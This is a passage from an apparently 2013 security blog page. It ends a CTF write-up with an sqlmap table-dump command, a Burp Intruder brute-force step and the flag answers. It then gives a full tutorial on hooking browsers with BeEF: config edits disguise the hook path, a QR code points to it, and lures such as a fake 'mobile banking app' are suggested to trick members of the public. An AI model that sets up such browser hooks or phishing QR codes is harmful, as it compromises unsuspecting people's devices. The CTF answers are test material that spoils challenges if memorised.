+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise.png"><img class="alignnone size-medium wp-image-115" alt="sql_compromise" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise-300x184.png" width="300" height="184" /></a></p>
+<p>So now all I had to do was run through the database, find the table I wanted and then dump it. Long story short, this was the syntax to do just that:</p>
+<pre>/sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1" -D "charsheet" -T "characters" --dump</pre>
+<p>This dumped a CSV file to the output folder and had three columns with names that could possibly be flags: cname, edited_by, and owner.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users.png"><img class="alignnone size-medium wp-image-113" alt="csv_of_users" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users-300x90.png" width="300" height="90" /></a></p>
+<p>I combined all of these columns into a file and then left only the unique ones in it with this command:</p>
+<pre>sort characters.txt | uniq -u</pre>
+<p>Finally, I pumped this list of about 120 entries to Burp Suite&#8217;s intruder, set it up to submit to the proper location, and started it. Within about 2 minutes the challenge was complete.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet.png"><img class="alignnone size-medium wp-image-112" alt="correct_flag_charsheet" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet-300x106.png" width="300" height="106" /></a></p>
+<p><strong>Answer: r3al50ftwar3ftw</strong></p>
+<h1>Unnnnlucky (Misc - 20)</h1>
+<p><strong>Problem: Where does The Plague hide his money?</strong></p>
+<p>This is a reference to the movie <em>Hackers </em>(1995). Unfortunately, the only way to know the answer to this is to have watched the movie.</p>
+<p><strong>Answer: <strong>03087-08351-27H</strong></strong></p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/page/2/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/page/2/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/04/12/fun-with-beef-qr-codes/">Hooking Browsers With BeEF & QR Codes</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-12T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>For those unfamiliar with the Browser Exploitation Framework Project, or BeEF, it is a tool that can be used to launch attacks against the often only door left open, the web browser. Once the browser is compromised, BeEF can launch further attacks to control the system. While some of us know not to scan any QR code we find, most people assume that they are safe. You can find them posted all around. Sales circulars, marketing materials, magazines, they&#8217;re everywhere. Why not take advantage of that inherent trust?</p>
+<p>For this tutorial, I&#8217;m going to assume that you are running Backtrack 5 R3 or Kali. If not, installation instructions can be found <a href="https://github.com/beefproject/beef/wiki/Installation">here</a>.</p>
+<h1>customhook</h1>
+<p>First things first, we need to edit the customhook config. When BeEF fires up, it sets the hook location to your.i.p.address/hook/ which is pretty obvious. So by editing the config, we can set a custom name for our hook and make it a little less conspicuous. The config can be found at $BEEF_ROOT/extensions/customhook/config.yaml. Pop that open with your favorite editor and change the values to whatever you want. Its pretty self-explanatory.</p>
+<pre>#
+# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    extension:
+        customhook:
+            enable: true
+            name: 'Custom Hook Point with iFrame Impersonation'
+            customhook_path: "/notice"
+            customhook_target: "http://heyyeyaaeyaaaeyaeyaa.com/"
+            customhook_title: "Notice"</pre>
+<p>Make sure you set &#8220;enable:&#8221; to true.</p>
+<h1>qrcode</h1>
+<p>Next, we need to edit the qrcode extension&#8217;s config. All you need to do here is set &#8220;enable:&#8221; to true and set the &#8220;target:&#8221; to your customhook location (or a bit.ly link of it if you&#8217;re feeling extra sneaky ;) ). It can be found at $BEEF_ROOT/extensions/qrcode/config.yaml.</p>
+<pre>#
+# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    extension:
+        qrcode:
+            name: 'QR Code Generator'
+            enable: true
+            authors: ["xntrik"]
+            target: ["mybeefserver.com/notice"]
+            qrsize: "300x300"</pre>
+<p>Now when you start BeEF, it will generate a QR code for your hook. You can also append the URL of your customhook to https://chart.googleapis.com/chart?cht=qr&amp;chs=300x300&amp;chl= and it&#8217;ll generate a code for you.</p>
+<h1>Attack!</h1>
+<p>Once you fire up BeEF after making the changes, it will create your custom hook in the location your set as well as provide you a URL where you can download your QR code from. Now the only thing left to do is figure out how you want to use it. &#8220;Scan this to try our new mobile banking app for your iPhone!&#8221; The possibilities are endless.</p>
+
+  
+  
+
+
+    </article>
+  
+
+    <nav role="navigation" id="pagination">
+  <span class="next">
+    <a href="/blog/page/3/" rel="next">Continue &rarr;</a>
+  </span>
+
+
+  <span class="prev">
+    <a href="/" rel="prev">Newer &larr;</a>
+  </span>
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
